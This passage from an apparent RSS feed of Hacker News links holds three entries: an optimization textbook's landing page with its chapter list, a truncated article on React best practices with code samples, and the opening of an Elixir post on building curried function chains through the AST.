February 13, 2021 | https://algorithmsbook.com/optimization/ | <a href="https://web.archive.org/web/*/https://algorithmsbook.com/optimization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">



				<!-- Header -->

					



				<!-- Main -->

					<div id="main">



						<!-- Intro -->

							<article id="intro">

								<h2>Intro</h2>

								<p>This book provides a comprehensive introduction to optimization with a focus on practical algorithms. The book approaches optimization from an engineering perspective, where the objective is to design a system that optimizes a set of metrics subject to constraints. Readers will learn about computational approaches for a range of challenges, including searching high-dimensional spaces, handling problems where there are multiple competing objectives, and accommodating uncertainty in the metrics. Figures, examples, and exercises convey the intuition behind the mathematical approaches. The text provides concrete implementations in the Julia programming language. Topics covered include derivatives and their generalization to multiple dimensions; local descent and first- and second-order methods that inform local descent; stochastic methods, which introduce randomness into the optimization process; linear constrained optimization, when both the objective function and the constraints are linear; surrogate models, probabilistic surrogate models, and using probabilistic surrogate models to guide optimization; optimization under uncertainty; uncertainty propagation; expression optimization; and multidisciplinary design optimization. Appendixes offer an introduction to the Julia language, test functions for evaluating algorithm performance, and mathematical concepts used in the derivation and analysis of the optimization methods discussed in the text. The book can be used by advanced undergraduates and graduate students in mathematics, statistics, computer science, any engineering field, (including electrical engineering and aerospace engineering), and operations research, and as a reference for professionals.</p>

							</article>



						<!-- Download -->

							<article id="download">

								<h2>Download</h2>

								<p>The full book is available as a <a href="https://algorithmsbook.com/optimization/files/optimization.pdf" rel="nofollow">PDF</a>. You can also download <a href="#outline">individual chapters</a>. The PDF is shared under a under a Creative Commons CC-BY-NC-ND license.
								</p>
								<p>
									The copyright of this book has been licensed exclusively to <a href="http://mitpress.mit.edu/">The MIT Press</a>.  All inquiries regarding rights should be addressed to The MIT Press, Rights and Permissions Department.
									A <a href="https://mitpress.mit.edu/books/algorithms-optimization">print version</a> is available for purchase.
								</p>


							</article>



						<!-- Outline -->

							<article id="outline">

								<h2>Outline</h2>

								<ol>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-1.pdf" rel="nofollow">Introduction</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-2.pdf" rel="nofollow">Derivatives and Gradients</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-3.pdf" rel="nofollow">Bracketing</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-4.pdf" rel="nofollow">Local Descent</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-5.pdf" rel="nofollow">First-Order Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-6.pdf" rel="nofollow">Second Order Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-7.pdf" rel="nofollow">Direct Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-8.pdf" rel="nofollow">Stochastic Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-9.pdf" rel="nofollow">Population Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-10.pdf" rel="nofollow">Constraints</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-11.pdf" rel="nofollow">Linear Constrained Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-12.pdf" rel="nofollow">Multiobjective Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-13.pdf" rel="nofollow">Sampling Plans</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-14.pdf" rel="nofollow">Surrogate Models</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-15.pdf" rel="nofollow">Probabilistic Surrogate Models</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-16.pdf" rel="nofollow">Surrogate Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-17.pdf" rel="nofollow">Optimization under Uncertainty</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-18.pdf" rel="nofollow">Uncertainty Propagation</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-19.pdf" rel="nofollow">Discrete Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-20.pdf" rel="nofollow">Expression Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-21.pdf" rel="nofollow">Multidisciplinary Optimization</a></li>

								</ol>

								<h3>Appendices</h3>

								<ol start="22">

								<li>A: <a href="https://algorithmsbook.com/optimization/files/appendix-a.pdf" rel="nofollow">Julia</a></li>

								<li>B: <a href="https://algorithmsbook.com/optimization/files/appendix-b.pdf" rel="nofollow">Test Functions</a></li>

								<li>C: <a href="https://algorithmsbook.com/optimization/files/appendix-c.pdf" rel="nofollow">Mathematical Concepts</a></li>

								<li>D: <a href="https://algorithmsbook.com/optimization/files/appendix-d.pdf" rel="nofollow">Solutions</a></li>

								</ol>

								

							</article>



						<!-- Bugs -->

							<article id="errata">

								<h2>Errata</h2>

								<p>Please file issues on <a href="https://github.com/algorithmsbooks/optimization/issues">GitHub</a> or email the address listed at the bottom of the pages of the PDF. The PDF is kept up to date with any corrections.

								</p>

							</article>



					</div>



				<!-- Footer -->

					



			</div></div>]]>
            </description>
            <link>https://algorithmsbook.com/optimization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124759</guid>
            <pubDate>Sat, 13 Feb 2021 17:02:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Best Practices for 2021]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26124742">thread link</a>) | @thenoisywatcher
<br/>
February 13, 2021 | https://blog.asayer.io/6-react-best-practices-for-2021 | <a href="https://web.archive.org/web/*/https://blog.asayer.io/6-react-best-practices-for-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Writing clean and readable code is essential to improve your code’s quality. On top of that, clean code is easier to test. There’s no reason not to spend five extra minutes refactoring your code to make it more readable.</p><p>This article looks at six React best practices for 2021 to improve your code. We’ll cover the following items:</p><ol><li>Make use of <code>event.target.name</code> for event handlers</li><li>How to avoid manually binding event handlers to <code>this</code>?</li><li>Make use of React hooks to update your state</li><li>Cache expensive operations with <code>useMemo</code></li><li>Decouple functions into functional functions to improve code quality</li><li>How do you create custom hooks in React?</li></ol><h2 id="1-use-event-handler-name">#1: Use event handler name</h2><p>When you have a form with a single input field, you’ll write one <code>onFirstInputChange</code> function to capture the contents of your input field.</p><p>However, do you write ten event handlers when you have a form with ten input fields? The answer is no.</p><p>We can set the name property on an input field and access it from the event handler. This value allows us to use a single input handler for <code>onChange</code> events. </p><p>Here’s your current situation when using a not-optimized form with two input fields. We have to define an <code>onChange</code> event handler for each individual form input element. This pattern creates a lot of duplicate code, which is hard to maintain.</p><div><pre><p><span>1</span><span>export</span><span> </span><span>default</span><span> </span><span>class</span><span> </span><span>App</span><span> </span><span>extends</span><span> </span><span>React</span><span>.</span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>        </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>        </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>            item1</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>6</span><span>            item2</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>7</span><span>            items</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>8</span><span>            errorMsg</span><span>:</span><span> </span><span>""</span><span></span></p><p><span>9</span><span>        </span><span>}</span><span>;</span><span></span></p><p><span>10</span><span>        </span><span>this</span><span>.</span><span>onFirstInputChange</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>onFirstInputChange</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>11</span><span>        </span><span>this</span><span>.</span><span>onSecondInputChange</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>onSecondInputChange</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>12</span><span>    </span><span>}</span><span></span></p><p><span>13</span><span>    </span><span>onFirstInputChange</span><span>(</span><span>event</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>14</span><span>        </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>15</span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>16</span><span>            item1</span><span>:</span><span> value</span></p><p><span>17</span><span>        </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>18</span><span>    </span><span>}</span><span></span></p><p><span>19</span><span>    </span><span>onSecondInputChange</span><span>(</span><span>event</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>20</span><span>        </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>21</span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>22</span><span>            item2</span><span>:</span><span> value</span></p><p><span>23</span><span>        </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>24</span><span>    </span><span>}</span><span></span></p><p><span>25</span><span>    </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>26</span><span>        </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>27</span><span>            </span><span>&lt;</span><span>div</span><span>&gt;</span><span></span></p><p><span>28</span><span>                </span><span>&lt;</span><span>div className</span><span>=</span><span>"input-section"</span><span>&gt;</span><span></span></p><p><span>29</span><span>                    </span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>errorMsg</span><span> </span><span>&amp;&amp;</span><span> </span><span>(</span><span></span></p><p><span>30</span><span>                        </span><span>&lt;</span><span>p className</span><span>=</span><span>"error-msg"</span><span>&gt;</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>errorMsg</span><span>}</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span></span></p><p><span>31</span><span>                    </span><span>)</span><span>}</span><span></span></p><p><span>32</span><span>                    </span><span>&lt;</span><span>input</span></p><p><span>33</span><span>                        type</span><span>=</span><span>"text"</span><span></span></p><p><span>34</span><span>                        name</span><span>=</span><span>"item1"</span><span></span></p><p><span>35</span><span>                        placeholder</span><span>=</span><span>"Enter text"</span><span></span></p><p><span>36</span><span>                        value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>item1</span><span>}</span><span></span></p><p><span>37</span><span>                        onChange</span><span>=</span><span>{</span><span>this</span><span>.</span><span>onFirstInputChange</span><span>}</span><span></span></p><p><span>38</span><span>                    </span><span>/</span><span>&gt;</span><span></span></p><p><span>39</span><span>                    </span><span>&lt;</span><span>input</span></p><p><span>40</span><span>                        type</span><span>=</span><span>"text"</span><span></span></p><p><span>41</span><span>                        name</span><span>=</span><span>"item2"</span><span></span></p><p><span>42</span><span>                        placeholder</span><span>=</span><span>"Enter more text"</span><span></span></p><p><span>43</span><span>                        value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>item2</span><span>}</span><span></span></p><p><span>44</span><span>                        onChange</span><span>=</span><span>{</span><span>this</span><span>.</span><span>onSecondInputChange</span><span>}</span><span></span></p><p><span>45</span><span>                    </span><span>/</span><span>&gt;</span><span></span></p><p><span>46</span><span>                </span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span><span></span></p><p><span>47</span><span>            </span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span><span></span></p><p><span>48</span><span>      </span><span>)</span><span>;</span><span></span></p><p><span>49</span><span>    </span><span>}</span><span></span></p><p><span>50</span><span></span><span>}</span></p></pre></div><p>As you can see, each event handler function updates the state. When dealing with multiple form elements, your code becomes very messy as you have to write a new function for every event.</p><p>Let’s tackle this situation differently using the <code>name</code> field. We can access this value via the <code>event.target.name</code> property. Now, we can create a single function that can handle both events at once. Therefore, we can remove both functions <code>onFirstInputChange</code> and <code>onSecondInputChange</code>.</p><div><pre><p><span>1</span><span>onInputChange</span><span> </span><span>=</span><span> </span><span>(</span><span>event</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>const</span><span> name </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>name</span><span>;</span><span></span></p><p><span>3</span><span>  </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>5</span><span>    </span><span>[</span><span>name</span><span>]</span><span>:</span><span> value</span></p><p><span>6</span><span>  </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span><span>;</span></p></pre></div><p>Easy, right? Of course, you often need additional validation for the data you save to your state. You can make use of a <code>switch</code> statement to add custom validation rules for each submitted value.</p><h2 id="2-avoid-manually-binding-this">#2: Avoid manually binding <code>this</code></h2><p>You will most likely know that React doesn’t retain the <code>this</code> binding when attaching an event handler to an <code>onClick</code> or <code>onChange</code> event. Therefore, we need to bind <code>this</code> manually. <em>Why do we bind</em> <code>*this*</code><em>?</em> We want to bind the <code>this</code> of the event handler to the component’ instance, so we don’t lose its context when we pass it as a callback.</p><p>Here’s a classic “binding” example that happens in the constructor.</p><div><pre><p><span>1</span><span>class</span><span> </span><span>Button</span><span> </span><span>extends</span><span> </span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span> clicked</span><span>:</span><span> </span><span>false</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>5</span><span>    </span><span>this</span><span>.</span><span>handleClick</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>handleClick</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span>  </span><span>}</span><span></span></p><p><span>7</span><span>  </span></p><p><span>8</span><span>  </span><span>handleClick</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>this</span><span>.</span><span>props</span><span>.</span><span>setState</span><span>(</span><span>{</span><span> clicked</span><span>:</span><span> </span><span>true</span><span> </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>}</span><span></span></p><p><span>11</span><span>  </span></p><p><span>12</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>13</span><span>    </span><span>return</span><span> </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>this</span><span>.</span><span>handleClick</span><span>}</span><span>&gt;</span><span>Click</span><span> me</span><span>!</span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span>;</span><span></span></p><p><span>14</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>15</span><span></span><span>}</span></p></pre></div><p>Yet, binding is not necessary anymore since the <code>create-react-app</code> CLI command makes use of <code>@babel/babel-plugin-transform-class-properties</code> plugin version &gt;=7 and <code>babel/plugin-proposal-class-properties</code> plugin version &lt;7. </p><blockquote><p>Note: You have to change the event handler syntax to arrow function syntax.</p></blockquote><p>Below you find an example of the arrow function syntax. Here, we don’t need to write additional code in the constructor to bind <code>this</code>.</p><div><pre><p><span>1</span><span>class</span><span> </span><span>Button</span><span> </span><span>extends</span><span> </span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span> clicked</span><span>:</span><span> </span><span>false</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>}</span><span></span></p><p><span>6</span><span>  </span></p><p><span>7</span><span>  </span><span>handleClick</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span>clicked</span><span>:</span><span> </span><span>true</span><span> </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>8</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>return</span><span> </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>this</span><span>.</span><span>handleClick</span><span>}</span><span>&gt;</span><span>Click</span><span> me</span><span>!</span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>11</span><span></span><span>}</span></p></pre></div><p>That’s as simple it can get! You don’t need to worry about binding functions in your constructor.</p><h2 id="3-use-react-hooks-to-update-your-state">#3: Use React hooks to update your state</h2><p>Since React version 16.8.0, it’s now possible to use state and lifecycle methods inside functional components using React Hooks. In other words, we can write better readable code that’s also much easier to maintain.</p><p>For this, we’ll be using the <code>useState</code> hook. For those that are not aware of what a hook is and why you would use it. Here’s a short definition from the <a href="https://reactjs.org/docs/hooks-state.html#whats-a-hook" target="_blank" rel="noreferrer">React documentation</a>.</p><blockquote><p><strong>What is a Hook?</strong> A Hook is a special function that lets you “hook into” React features. For example, useState is a Hook that lets you add React state to function components.</p></blockquote><blockquote><p><strong>When would I use a Hook?</strong> If you write a function component and realize you need to add some state to it, previously you had to convert it to a class. Now you can use a Hook inside the existing function component.</p></blockquote><p>First, let’s take a look at how we update the state using the <code>setState</code> hook.</p><div><pre><p><span>1</span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>2</span><span>    errorMsg</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>3</span><span>    items</span><span>:</span><span> </span><span>[</span><span>item1</span><span>,</span><span> item2</span><span>]</span><span></span></p><p><span>4</span><span></span><span>}</span><span>)</span><span>;</span></p></pre></div><p>Now, let’s make use of the <code>useState</code> hook. We need to import this hook from the <code>react</code> library. We can now declare new state variables and pass them an initial value. We’ll use destructuring to get a variable for retrieving the value and one for setting the value (this one is a function). Let’s take a look at how we can do this for the above example.</p><div><pre><p><span>1</span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> </span><span>App</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>[</span><span>items</span><span>,</span><span> setIems</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>[</span><span>errorMsg</span><span>,</span><span> setErrorMsg</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>""</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span></span><span>}</span><span>;</span><span></span></p><p><span>7</span><span></span></p><p><span>8</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>App</span><span>;</span></p></pre></div><p>Now, you can directly access both constants <code>items</code> and <code>errorMsg</code> in your component.</p><p>Further, we can update the state inside a function like this:</p><div><pre><p><span>1</span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> </span><span>App</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>[</span><span>items</span><span>,</span><span> setIems</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>[</span><span>errorMsg</span><span>,</span><span> setErrorMsg</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>""</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>8</span><span>    </span><span>&lt;</span><span>form</span><span>&gt;</span><span></span></p><p><span>9</span><span>        </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>setItems</span><span>(</span><span>[</span><span>"item A"</span><span>,</span><span> </span><span>"item B"</span><span>]</span><span>)</span><span>}</span><span>&gt;</span><span></span></p><p><span>10</span><span>          </span><span>Set</span><span> items</span></p><p><span>11</span><span>        </span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span></span></p><p><span>12</span><span>    </span><span>&lt;</span><span>/</span><span>form</span><span>&gt;</span><span></span></p><p><span>13</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>14</span><span></span><span>}</span><span>;</span><span></span></p><p><span>15</span><span></span></p><p><span>16</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>App</span><span>;</span></p></pre></div><p>That’s how you can use state hooks.</p><h2 id="4-cache-expensive-operations-with-usememo">#4: Cache expensive operations with useMemo</h2><p>Memoization is an optimization technique to store the result of expensive operations. In other words, a sorting operation is often an expensive operation that requires a lot of processing. We don’t want to execute this expensive function for every page render.</p><p>Therefore, we can use the <code>useMemo</code> hook to remember the output when you pass the same parameters to the <a href="https://rossbulat.medium.com/how-to-memoize-in-react-3d20cbcd2b6e" target="_blank" rel="noreferrer">memoized function</a>. The <code>useMemo</code> hook accepts a function and the input parameters to remember. React refers to this as a dependencies array. Every value referenced inside the function should also appear in your dependencies array.</p><p>Here’s a simple, abstract example. We pass two parameters <code>a</code> and <code>b</code> to an expensive function. As the function uses both parameters, we’ve to add them to the dependencies array for our <code>useMemo</code> hook.</p><div><pre><p><span>1</span><span>const</span><span> memoizedValue </span><span>=</span><span> </span><span>useMemo</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>computeExpensiveValue</span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span>,</span><span> </span><span>[</span><span>a</span><span>,</span><span> b</span><span>]</span><span>)</span><span>;</span></p></pre></div><h2 id="5-decouple-functions-into-pure-functions-to-improve-code-quality">#5: Decouple functions into pure functions to improve code quality</h2><p>As a general React best practice, you should decouple functions that don’t rely on your component. In other words, a function that doesn’t rely on any state or React hooks.</p><p>Therefore, a sorting function is an excellent example of a function that you can extract as a pure function. </p><p>You might wonder why you should embrace functional programming? </p><blockquote><p>Functional programming is the process of building software by composing pure functions, avoiding shared state, mutable data, and side-effects. Pure function are better readable and easier to test. Therefore, they improve code quality. - <a href="https://www.freecodecamp.org/news/intro-to-functional-programming-basics/" target="_blank" rel="noreferrer">freeCodeCamp</a></p></blockquote><p>Now, let’s apply this concept to React components. Here’s a function that can sit both inside a React component or outside. Both are comparison functions, which you can pass to an expensive sorting function, that accept two input parameters. As there’s no interaction with the state, we can extract both functions to pure functions. This allows us to place the pure functions in a separate file and import them in multiple locations if needed.</p><div><pre><p><span>1</span><span>function</span><span> </span><span>ascSort</span><span> </span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>return</span><span> a </span><span>&lt;</span><span> b </span><span>?</span><span> </span><span>-</span><span>1</span><span> </span><span>:</span><span> </span><span>(</span><span>b </span><span>&gt;</span><span> a </span><span>?</span><span> </span><span>1</span><span> </span><span>:</span><span> </span><span>0</span><span>)</span><span>;</span><span></span></p><p><span>3</span><span></span><span>}</span><span></span></p><p><span>4</span><span></span></p><p><span>5</span><span></span><span>function</span><span> </span><span>descSort</span><span> </span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>  </span><span>return</span><span> b </span><span>&lt;</span><span> a </span><span>?</span><span> </span><span>-</span><span>1</span><span> </span><span>:</span><span> </span><span>(</span><span>a </span><span>&gt;</span><span> b </span><span>?</span><span> </span><span>1</span><span> </span><span>:</span><span> </span><span>0</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span></p></pre></div><h2 id="6-create-custom-react-hooks">#6: Create custom React hooks</h2><p>We’ve learned how to use the <code>useState</code> and <code>useMemo</code> React hooks. Yet, React allows you to define your own React hooks to extract logic and make components more readable. </p><p>We can specify custom React hooks starting with the <code>use</code> keyword, like all other React hooks. It’s beneficial when you want to share logic between different functions. Instead of copying the function, we can define the logic as a React hook and reuse it in other functions.</p><p>Here’s an example of a React component that updates the state when the screen size gets reduced to below 600 pixels. If this happens, the <code>isScreenSmall</code> variable is set to <code>true</code>. Otherwise, the variable is set to <code>fa…</code></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/6-react-best-practices-for-2021">https://blog.asayer.io/6-react-best-practices-for-2021</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/6-react-best-practices-for-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124742</guid>
            <pubDate>Sat, 13 Feb 2021 17:00:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cursed Curried Elixir]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124431">thread link</a>) | @evuez
<br/>
February 13, 2021 | https://liftm.io/posts/cursed-curried-elixir.html | <a href="https://web.archive.org/web/*/https://liftm.io/posts/cursed-curried-elixir.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
        <time datetime="2021-02-13">2021-02-13</time>
      <p>In <a href="https://liftm.io/posts/curried-elixir.html">Curried Elixir</a>, I said this:</p>
<blockquote>
<p>We're going to do this by wrapping <code>my_fun</code> in a chain of anonymous functions, each binding exactly one name:</p>
<pre><code>curried_fun =
  fn (a) -&gt;
    fn (b) -&gt;
      fn (c) -&gt;
        my_fun.(a, b, c)
      end
    end
  end
</code></pre>
</blockquote>
<p>And then went on implementing <code>curry</code> as a recursive function. But what if I actually want my curried function to be a chain of anonymous functions, and get rid of this recursive call?</p>
<p>The obvious thing to do would be to try to implement this as a macro instead. But I think we can do better than this.</p>
<p>First, let's look at the <a href="https://hexdocs.pm/elixir/syntax-reference.html#the-elixir-ast">AST</a> for the <code>curried_fun</code> above:</p>
<pre><code>iex&gt; quote do
...&gt;   fn (a) -&gt;
...&gt;     fn (b) -&gt;
...&gt;       fn (c) -&gt;
...&gt;         my_fun.(a, b, c)
...&gt;       end
...&gt;     end
...&gt;   end
...&gt; end
#                ▼ metadata                ▼ nested anonymous function
{:fn, [], [{:-&gt;, [], [[{:a, [], Elixir}], {:fn, [], [{:-&gt;, ...}]}]}]}
#                      ▲ list of parameters
</code></pre>
<p>This might look a bit messy, but there really isn't much going on:</p>
<pre><code>{:fn, [], # The definition with an empty list of metadata
 [
   {:-&gt;, [],
    [
      [{:a, [], Elixir}], # Left-hand side of `-&gt;`, the head of the anonymous function
      {:fn , [], # Right-hand side of `-&gt;`, the body of the anonymous function
       ...
</code></pre>
<h2>Building the AST</h2>
<p>Just to get started, let's see if we can write a function that generates this AST for us.
We want this function to take as arguments the length of the chain and the body of the innermost function in the chain:</p>
<pre><code>def make_chain(length_, body) do
  Enum.reduce(1..length_, body, fn x, acc -&gt;
    {:fn, [], [{:-&gt;, [], [[{:"arg#{x}", [], nil}], acc]}]}
  end)
end
</code></pre>
<p>Or better, use <a href="https://hexdocs.pm/elixir/Macro.html#generate_unique_arguments/2"><code>Macro.generate_unique_arguments/2</code></a> to generate the list of parameters for us:</p>
<pre><code>defmodule Func do
  def make_chain(length_, body) do
    length_
    |&gt; Macro.generate_unique_arguments(nil)
    |&gt; Enum.reverse() # Without this, the outermost function would get the last argument, which could make things confusing
    |&gt; Enum.reduce(body, fn arg, acc -&gt;
      {:fn, [], [{:-&gt;, [], [[arg], acc]}]}
    end)
  end
end
</code></pre>
<p>We can use <a href="https://hexdocs.pm/elixir/Macro.html#to_string/2"><code>Macro.to_string/1</code></a> to check if this works as expected:</p>
<pre><code>iex&gt; Macro.to_string(make_chain(2, "Foo"))
"fn arg1 -&gt; fn arg2 -&gt; \"Foo\" end end"
</code></pre>
<p>Perfect! 🎉</p>
<p>We have one thing left to do before we can start rewriting <code>curry</code>: we need to generate the AST to call <code>fun</code>. This is actually pretty easy:</p>
<pre><code>iex&gt; quote do: fun.(a, b)
{{:., [], [{:fun, [], Elixir}]}, [], [{:a, [], Elixir}, {:b, [], Elixir}]}
</code></pre>
<p>All we need is <a href="https://hexdocs.pm/elixir/Macro.html#generate_unique_arguments/2"><code>Macro.generate_unique_arguments/2</code></a> and <a href="https://hexdocs.pm/elixir/master/Function.html#info/2"><code>Function.info/2</code></a> to get the arity of <code>fun</code>:</p>
<pre><code>iex&gt; fun = &amp;Map.get/2
iex&gt; {:arity, arity} = Function.info(fun, :arity)
iex&gt; params = Macro.generate_unique_arguments(arity, nil)
